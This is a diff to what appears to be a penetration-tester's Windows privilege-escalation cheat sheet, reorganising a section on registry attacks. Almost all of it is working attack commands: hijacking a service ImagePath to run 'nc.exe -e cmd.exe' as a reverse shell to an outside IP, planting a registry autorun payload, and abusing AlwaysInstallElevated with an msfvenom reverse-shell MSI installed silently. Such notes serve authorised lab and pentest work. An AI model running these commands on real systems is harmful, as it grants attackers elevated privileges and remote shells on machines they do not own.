@@ -781,22 +781,38 @@ SERVICE_NAME: SystemExplorerHelpService
         BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
 ```
 
-## Weak Registry Permissions
+## Registry Attacks
 
 ```powershell
-# enum
-accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services
 
->    RW HKLM\System\CurrentControlSet\services\ModelManagerService
+# Weak Registry Permissions
+## enum
+accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services
+>    RW HKLM\System\CurrentControlSet\services\<service name>
 >    KEY_ALL_ACCESS
 
-Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
-
+## set path to your payload
+Set-ItemProperty -Path "Registry::HKLM:\SYSTEM\CurrentControlSet\Services\<service name>" -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+## restart the service 
 sc start ModelManagerService
 
 
-## Modifiable Registry Autorun Binary
+# Modifiable Registry Autorun Binary
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+Get-Acl "Registry::<path>" | Format-List
+## set path to your payload
+New-ItemProperty -Path "Registry::<path>" -Name "MyApp" -Value "C:\Path\To\YourApp.exe" -PropertyType String
+
+
+# Always Install Elevated
+## if both true
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+## create payload in linux 
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+## run 
+msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+
 
 ```
 
